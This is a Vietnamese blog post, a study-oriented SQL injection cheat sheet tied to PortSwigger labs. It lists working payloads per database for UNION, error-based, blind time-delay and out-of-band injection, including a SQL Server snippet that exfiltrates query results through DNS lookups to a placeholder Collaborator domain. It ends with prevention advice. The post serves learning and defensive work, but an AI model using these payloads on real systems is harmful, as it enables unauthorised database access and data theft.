---

layout: post
title: "SQL Injection Cheat Sheet: Tờ phao hợp pháp cho dân Web Security"
date: 2026-07-08 18:45:00 +0700
categories: [Web Security, SQL Injection]
tags: [sql-injection, web-security, portswigger, owasp, cheat-sheet]
description: "Tổng hợp cú pháp SQL Injection thường gặp theo từng hệ quản trị cơ sở dữ liệu như Oracle, SQL Server, PostgreSQL và MySQL."
---

> **Disclaimer:** Bài viết này chỉ phục vụ mục đích học tập, thực hành trong môi trường lab như PortSwigger Web Security Academy, CTF hoặc hệ thống bạn được phép kiểm thử. Không sử dụng các kỹ thuật này trên hệ thống thật khi chưa có sự cho phép.

## 1. SQL Injection là gì?

SQL Injection là lỗ hổng xảy ra khi ứng dụng đưa dữ liệu người dùng nhập vào trực tiếp trong câu truy vấn SQL mà không xử lý an toàn.

Kẻ tấn công có thể thay đổi logic truy vấn, đọc dữ liệu không được phép, hoặc trong một số trường hợp có thể tác động đến hệ thống cơ sở dữ liệu.

Ví dụ một URL có tham số:

```text
/filter?category=Pets
```

Ứng dụng phía sau có thể tạo câu SQL như sau:

```sql
SELECT * FROM products WHERE category = 'Pets';
```

Nếu tham số `category` không được kiểm soát tốt, ta có thể thử chèn thêm cú pháp SQL để kiểm tra lỗ hổng.

---

## 2. Comment trong SQL

Comment dùng để bỏ qua phần còn lại của câu truy vấn gốc sau điểm injection.

| Database             | Cú pháp comment                         |
| -------------------- | --------------------------------------- |
| Oracle               | `--comment`                             |
| Microsoft SQL Server | `--comment`, `/*comment*/`              |
| PostgreSQL           | `--comment`, `/*comment*/`              |
| MySQL                | `#comment`, `-- comment`, `/*comment*/` |

> Với MySQL, sau `--` thường cần có dấu cách.

Ví dụ:

```sql
' OR 1=1-- 
```

Ý nghĩa:

* Đóng chuỗi hiện tại bằng dấu `'`
* Thêm điều kiện luôn đúng `OR 1=1`
* Comment phần còn lại của query bằng `--`

---

## 3. String Concatenation

String concatenation là nối nhiều chuỗi lại thành một chuỗi.

| Database             | Cú pháp                                  |     |        |
| -------------------- | ---------------------------------------- | --- | ------ |
| Oracle               | `'foo'                                   |     | 'bar'` |
| Microsoft SQL Server | `'foo'+'bar'`                            |     |        |
| PostgreSQL           | `'foo'                                   |     | 'bar'` |
| MySQL                | `'foo' 'bar'` hoặc `CONCAT('foo','bar')` |     |        |

Kết quả:

```text
foobar
```

Kỹ thuật này hữu ích khi cần nối dữ liệu, ví dụ nối `username` và `password` thành một chuỗi để hiển thị qua lỗi hoặc qua kết quả trả về.

---

## 4. Substring

Substring dùng để lấy một phần của chuỗi. Chỉ số bắt đầu thường tính từ 1.

Các ví dụ dưới đây đều trả về chuỗi:

```text
ba
```

| Database             | Cú pháp                     |
| -------------------- | --------------------------- |
| Oracle               | `SUBSTR('foobar', 4, 2)`    |
| Microsoft SQL Server | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL           | `SUBSTRING('foobar', 4, 2)` |
| MySQL                | `SUBSTRING('foobar', 4, 2)` |

Giải thích:

```text
foobar
123456
```

Ký tự thứ 4 là `b`, lấy 2 ký tự sẽ được `ba`.

Kỹ thuật này thường xuất hiện trong Blind SQL Injection, khi cần dò từng ký tự của dữ liệu.

---

## 5. Kiểm tra version database

Xác định loại database rất quan trọng vì mỗi hệ quản trị cơ sở dữ liệu có cú pháp khác nhau.

| Database             | Câu lệnh                          |
| -------------------- | --------------------------------- |
| Oracle               | `SELECT banner FROM v$version;`   |
| Oracle               | `SELECT version FROM v$instance;` |
| Microsoft SQL Server | `SELECT @@version;`               |
| PostgreSQL           | `SELECT version();`               |
| MySQL                | `SELECT @@version;`               |

Ví dụ trong UNION SQL Injection:

```sql
' UNION SELECT version(),NULL,NULL--
```

Payload trên chỉ chạy được nếu số cột và kiểu dữ liệu phù hợp.

---

## 6. Liệt kê bảng và cột trong database

Khi khai thác SQL Injection, sau khi xác định được số cột và cột nào hiển thị ra response, bước tiếp theo thường là tìm tên bảng và tên cột.

### Oracle

Liệt kê bảng:

```sql
SELECT * FROM all_tables;
```

Liệt kê cột của một bảng:

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE';
```

### Microsoft SQL Server, PostgreSQL, MySQL

Liệt kê bảng:

```sql
SELECT * FROM information_schema.tables;
```

Liệt kê cột:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';
```

Ví dụ:

```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

Nếu cột đầu tiên được hiển thị trên trang, ta có thể thấy danh sách tên bảng.

---

## 7. UNION SQL Injection

`UNION` dùng để gộp kết quả của nhiều câu `SELECT`.

Ví dụ:

```sql
SELECT name, description FROM products
UNION
SELECT username, password FROM users;
```

Điều kiện quan trọng khi dùng `UNION`:

* Hai câu `SELECT` phải có cùng số lượng cột.
* Kiểu dữ liệu ở từng vị trí cột phải tương thích.
* Cột nào được ứng dụng hiển thị ra response thì mới có ích cho việc đọc dữ liệu.

### Xác định số cột bằng NULL

Thử lần lượt:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Nếu payload có số lượng `NULL` bằng với số cột của query gốc, truy vấn sẽ hợp lệ.

Ví dụ:

```sql
' UNION SELECT NULL,NULL,NULL--
```

Nếu payload này chạy thành công, có thể suy ra query gốc trả về 3 cột.

Lý do dùng `NULL`: `NULL` tương thích với nhiều kiểu dữ liệu phổ biến, nên giảm khả năng bị lỗi kiểu dữ liệu.

---

## 8. Conditional Errors

Conditional error là kỹ thuật tạo lỗi có điều kiện.

Nếu điều kiện đúng thì database gây lỗi. Nếu điều kiện sai thì không gây lỗi.

Kỹ thuật này hay dùng trong Blind SQL Injection, khi trang web không hiển thị dữ liệu trực tiếp nhưng có phản ứng khác nhau khi query lỗi hoặc không lỗi.

| Database             | Payload mẫu                                                                              |
| -------------------- | ---------------------------------------------------------------------------------------- |
| Oracle               | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;`      |
| Microsoft SQL Server | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END;`                         |
| PostgreSQL           | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END);`          |
| MySQL                | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a');` |

Ý tưởng:

```sql
CASE WHEN điều_kiện_đúng THEN gây_lỗi ELSE không_lỗi END
```

Nếu response khác nhau giữa hai trường hợp, ta có thể suy ra điều kiện đúng hay sai.

---

## 9. Extracting Data via Error Messages

Một số ứng dụng hiển thị lỗi database trực tiếp. Nếu vậy, có thể lợi dụng thông báo lỗi để làm lộ dữ liệu.

### Microsoft SQL Server

```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret');
```

Lỗi có thể làm lộ chuỗi:

```text
Conversion failed when converting the varchar value 'secret' to data type int.
```

### PostgreSQL

```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);
```

Nếu `password` là chuỗi, database có thể báo lỗi ép kiểu và làm lộ nội dung.

### MySQL

```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')));
```

Kỹ thuật này phụ thuộc rất nhiều vào việc ứng dụng có trả lỗi database ra response hay không.

---

## 10. Batched / Stacked Queries

Stacked queries là kỹ thuật chạy nhiều câu SQL liên tiếp trong cùng một lần gửi.

Ví dụ:

```sql
QUERY-1-HERE; QUERY-2-HERE
```

| Database             | Hỗ trợ                                        |
| -------------------- | --------------------------------------------- |
| Oracle               | Thường không hỗ trợ theo cách này             |
| Microsoft SQL Server | Có                                            |
| PostgreSQL           | Có                                            |
| MySQL                | Có, nhưng thường bị giới hạn bởi API ứng dụng |

Lưu ý: Với MySQL, stacked queries thường không dùng được trong SQL Injection, trừ khi ứng dụng sử dụng một số API cho phép chạy nhiều statement.

Kỹ thuật này thường hữu ích trong blind vulnerabilities, ví dụ dùng query thứ hai để tạo time delay hoặc DNS lookup.

---

## 11. Time Delay

Time delay dùng để khiến database phản hồi chậm lại trong một khoảng thời gian.

Nếu response bị trễ, ta biết payload đã được thực thi.

| Database             | Payload                               |
| -------------------- | ------------------------------------- |
| Oracle               | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft SQL Server | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL           | `SELECT pg_sleep(10);`                |
| MySQL                | `SELECT SLEEP(10);`                   |

Ví dụ với PostgreSQL:

```sql
' UNION SELECT pg_sleep(10),NULL,NULL--
```

Nếu trang phản hồi chậm khoảng 10 giây, có thể suy ra payload được thực thi.

---

## 12. Conditional Time Delay

Conditional time delay là gây trễ có điều kiện.

Nếu điều kiện đúng thì delay. Nếu điều kiện sai thì không delay.

| Database             | Payload mẫu                                                                      |     |                                                               |
| -------------------- | -------------------------------------------------------------------------------- | --- | ------------------------------------------------------------- |
| Oracle               | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'                                 |     | dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;` |
| Microsoft SQL Server | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10';`                               |     |                                                               |
| PostgreSQL           | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END;` |     |                                                               |
| MySQL                | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a');`                                  |     |                                                               |

Ví dụ ý tưởng:

```text
Nếu ký tự đầu tiên của password là 'a' thì sleep 10 giây.
Nếu không thì trả về ngay.
```

Từ đó có thể dò dữ liệu từng ký tự trong trường hợp Blind SQL Injection.

---

## 13. DNS Lookup

DNS lookup dùng để khiến database gọi ra một domain bên ngoài.

Trong lab, thường dùng Burp Collaborator để tạo domain riêng, sau đó kiểm tra xem database có gọi tới domain đó không.

Kỹ thuật này thường dùng trong Out-of-Band SQL Injection.

| Database             | Payload mẫu                                                           |
| -------------------- | --------------------------------------------------------------------- |
| Oracle               | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN');`  |
| Microsoft SQL Server | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a';`          |
| PostgreSQL           | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN';` |
| MySQL                | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a');`                    |

Khi Burp Collaborator nhận được DNS request, điều đó chứng minh payload đã được thực thi ở phía database.

---

## 14. DNS Lookup with Data Exfiltration

Kỹ thuật này không chỉ tạo DNS lookup mà còn nhúng dữ liệu lấy được vào subdomain.

Ý tưởng:

```text
secret-data.BURP-COLLABORATOR-SUBDOMAIN
```

Khi database gọi DNS tới domain này, ta có thể xem được phần dữ liệu trong Burp Collaborator.

Ví dụ Microsoft SQL Server:

```sql
declare @p varchar(1024);
set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"');
```

Đây là kỹ thuật nâng cao và chỉ nên thực hành trong lab có cấp quyền rõ ràng.

---

## 15. Bảng tóm tắt nhanh

| Mục đích  | Oracle                      | Microsoft SQL Server | PostgreSQL           | MySQL                |      |     |      |                   |
| --------- | --------------------------- | -------------------- | -------------------- | -------------------- | ---- | --- | ---- | ----------------- |
| Nối chuỗi | `'a'                        |                      | 'b'`                 | `'a'+'b'`            | `'a' |     | 'b'` | `CONCAT('a','b')` |
| Cắt chuỗi | `SUBSTR()`                  | `SUBSTRING()`        | `SUBSTRING()`        | `SUBSTRING()`        |      |     |      |                   |
| Comment   | `--`                        | `--`, `/* */`        | `--`, `/* */`        | `#`, `-- `, `/* */`  |      |     |      |                   |
| Version   | `v$version`                 | `@@version`          | `version()`          | `@@version`          |      |     |      |                   |
| Delay     | `dbms_pipe.receive_message` | `WAITFOR DELAY`      | `pg_sleep()`         | `SLEEP()`            |      |     |      |                   |
| Schema    | `all_tables`                | `information_schema` | `information_schema` | `information_schema` |      |     |      |                   |

---

## 16. Cách phòng chống SQL Injection

Để phòng chống SQL Injection, không nên nối chuỗi trực tiếp để tạo câu SQL.

### Không an toàn

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Nếu người dùng nhập payload độc hại, query có thể bị thay đổi logic.

### An toàn hơn: Prepared Statement

```sql
SELECT * FROM users WHERE username = ? AND password = ?;
```

Các giá trị người dùng nhập sẽ được truyền dưới dạng tham số, không bị hiểu là cú pháp SQL.

Một số biện pháp phòng chống quan trọng:

* Sử dụng prepared statements hoặc parameterized queries.
* Không nối chuỗi SQL trực tiếp từ input người dùng.
* Kiểm tra và giới hạn input.
* Không hiển thị lỗi database trực tiếp ra người dùng.
* Cấp quyền database theo nguyên tắc least privilege.
* Dùng WAF như lớp bảo vệ bổ sung, không thay thế secure coding.
* Log và giám sát các request bất thường.

---

## 17. Kết luận

SQL Injection là một trong những lỗ hổng web phổ biến và nguy hiểm nhất.

Khi học SQL Injection, cần hiểu rõ các khái niệm như:

* Comment
* UNION
* Substring
* Time delay
* Error-based injection
* Out-of-band injection

Tuy nhiên, mục tiêu quan trọng nhất không chỉ là biết cách khai thác trong lab, mà còn là biết cách phòng chống trong ứng dụng thật.

```text
Học SQL Injection để hiểu cách tấn công.
Hiểu cách tấn công để viết code an toàn hơn.
```

## Tài liệu tham khảo

* PortSwigger Web Security Academy - SQL Injection
* OWASP Web Security Testing Guide
* OWASP SQL Injection Prevention Cheat Sheet
